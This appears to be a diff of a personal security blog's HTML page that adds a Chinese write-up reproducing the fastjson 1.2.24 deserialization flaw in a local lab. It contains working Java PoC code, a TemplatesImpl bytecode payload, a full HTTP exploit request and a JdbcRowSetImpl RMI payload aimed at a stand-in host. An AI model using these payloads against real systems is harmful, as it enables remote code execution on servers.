@@ -317,6 +317,204 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/fastjson-deserialize/index.html">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Imagemlt">
+      <meta itemprop="description" content="personal blog">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Image's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/post/fastjson-deserialize/index.html" itemprop="url">
+                  fastjson反序列化复现
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-12-25 23:09:45" itemprop="dateCreated datePublished" datetime="2018-12-25T23:09:45+08:00">2018-12-25</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/web/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="fastjson反序列化复现"><a href="#fastjson反序列化复现" class="headerlink" title="fastjson反序列化复现"></a>fastjson反序列化复现</h1><p>最近复现一些java方面的漏洞，之前护网杯遇到过一次fastjson反序列化利用的题目，于是这里便从在idea中创建一个maven项目开始复现一下fastjson的反序列化漏洞。</p>
+<p>fastjson反序列化漏洞的主要影响范围是&lt;=1.2.24版本的fastjson。因此，参考<a href="https://blog.csdn.net/zzy1078689276/article/details/78732183/">在IDEA中创建maven项目</a>在创建好maven项目之后，编辑pom.xml加入fastjson需要的dependency：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>之后首先编辑ShellExec类,这个类也是反序列化的一个目标类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.alijsondeser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShellExec</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ShellExec</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"mkdir /tmp/imagemlt"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ShellExec t = <span class="keyword">new</span> ShellExec();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后便是我们的poc类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.alijsondeser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by web on 2017/4/29.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readClass</span><span class="params">(String cls)</span></span>&#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(cls)), bos);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title">test_autoTypeDeny</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        <span class="keyword">final</span> String fileSeparator = System.getProperty(<span class="string">"file.separator"</span>);</span><br><span class="line">        <span class="keyword">final</span> String evilClassPath = System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/target/classes/com/alijsondeser/ShellExec.class"</span>;</span><br><span class="line">        <span class="comment">//final String evilClassPath = "/tmp/ShellExec.class";</span></span><br><span class="line">        String evilCode = readClass(evilClassPath);</span><br><span class="line">        <span class="keyword">final</span> String NASTY_CLASS = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">        String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">"\",\"_bytecodes\":[\""</span>+evilCode+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line">                <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br><span class="line">        System.out.println(text1);</span><br><span class="line"></span><br><span class="line">        Object obj = JSON.parseObject(text1,Object.class,config,Feature.SupportNonPublicField);</span><br><span class="line">        <span class="comment">//assertEquals(Model.class, obj.getClass());</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            test_autoTypeDeny();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行poc，查看目录可以看到已经被执行</p>
+<p><img src="https://coding.net/u/ImageMLT/p/blog-images/git/raw/master/image-20181225231956222.png" alt="image-20181225231956222"></p>
+<p>生成的payload为：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADMANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABxMY29tL2FsaWpzb25kZXNlci9TaGVsbEV4ZWM7AQAKRXhjZXB0aW9ucwcALAEACXRyYW5zZm9ybQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALQEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAF0BwAuAQAKU291cmNlRmlsZQEADlNoZWxsRXhlYy5qYXZhDAAIAAkHAC8MADAAMQEAE21rZGlyIC90bXAvaW1hZ2VtbHQMADIAMwEAGmNvbS9hbGlqc29uZGVzZXIvU2hlbGxFeGVjAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAAAwABAANAA0ADgAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABEADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABQADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAFwAIABgADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ="],'_name':'a.b','_tfactory':&#123; &#125;,"_outputProperties":&#123; &#125;,"_name":"a","_version":"1.0","allowedProtocols":"all"&#125;</span><br></pre></td></tr></table></figure>
+<p>web环境下的测试可以使用war包<a href="https://raw.githubusercontent.com/yaofeifly/vulhub/master/fastjson/vuln/fastjson-1.0.war">https://raw.githubusercontent.com/yaofeifly/vulhub/master/fastjson/vuln/fastjson-1.0.war</a>,从tomcat后台导入。</p>
+<p>之后我们只需要用post方式发包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /fastjson-1.0/ HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:64.0) Gecko/20100101 Firefox/64.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh,en-US;q=0.7,en;q=0.3</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 2272</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADMANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABxMY29tL2FsaWpzb25kZXNlci9TaGVsbEV4ZWM7AQAKRXhjZXB0aW9ucwcALAEACXRyYW5zZm9ybQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALQEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAF0BwAuAQAKU291cmNlRmlsZQEADlNoZWxsRXhlYy5qYXZhDAAIAAkHAC8MADAAMQEAE21rZGlyIC90bXAvaW1hZ2VtbHQMADIAMwEAGmNvbS9hbGlqc29uZGVzZXIvU2hlbGxFeGVjAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAAAwABAANAA0ADgAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABEADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABQADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAFwAIABgADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=&quot;],&apos;_name&apos;:&apos;a.b&apos;,&apos;_tfactory&apos;:&#123; &#125;,&quot;_outputProperties&quot;:&#123; &#125;,&quot;_name&quot;:&quot;a&quot;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://coding.net/u/ImageMLT/p/blog-images/git/raw/master/image-20181225232621535.png" alt="image-20181225232621535"></p>
+<p><img src="https://coding.net/u/ImageMLT/p/blog-images/git/raw/master/image-20181225232645986.png" alt="image-20181225232645986"></p>
+<p>可以看到文件夹已经被创建且与tomcat运行用户权限相同(root)。</p>
+<p>getshell只需要先wget一个脚本再执行即可。</p>
+<p>关于fastjson反序列化漏洞的发现我们可以让服务器发送请求到我们的公网vps：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>, <span class="attr">"dataSourceName"</span>:<span class="string">"rmi://your-ip:1099/Object"</span>,<span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://coding.net/u/ImageMLT/p/blog-images/git/raw/master/A02006C436BC279ED0C41ABF1DE6324E.png" alt="B8F7CB04-3AF7-45AC-BB48-AC90A719741A"></p>
+<p>出现如图的回显即可确认存在反序列化漏洞。</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/metinfo-reflected-xss-bypass-chrome/index.html">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -380,7 +578,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
+                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
               
             
           </span>
@@ -583,7 +781,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
+                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
               
             
           </span>
@@ -771,7 +969,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
+                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
               
             
           </span>
@@ -967,7 +1165,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
+                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
               
             
           </span>
@@ -1159,7 +1357,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
+                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
               
             
           </span>
@@ -1379,7 +1577,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
+                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
               
             
           </span>
@@ -1627,7 +1825,7 @@ linker_and_loader->end</textarea><textarea id="flowchart-0-options" style="displ
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
+                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
               
             
           </span>
@@ -1795,7 +1993,7 @@ linker_and_loader->end</textarea><textarea id="flowchart-0-options" style="displ
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
+                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
               
             
           </span>
@@ -2051,7 +2249,7 @@ linker_and_loader->end</textarea><textarea id="flowchart-0-options" style="displ
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
+                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
               
             
           </span>
@@ -2174,213 +2372,6 @@ linker_and_loader->end</textarea><textarea id="flowchart-0-options" style="displ
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/isitdtuctf-web-writeup/index.html">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Imagemlt">
-      <meta itemprop="description" content="personal blog">
-      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Image's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/post/isitdtuctf-web-writeup/index.html" itemprop="url">
-                  isitdtuctf web writeup
-                </a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2018-08-02 15:56:42" itemprop="dateCreated datePublished" datetime="2018-08-02T15:56:42+08:00">2018-08-02</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
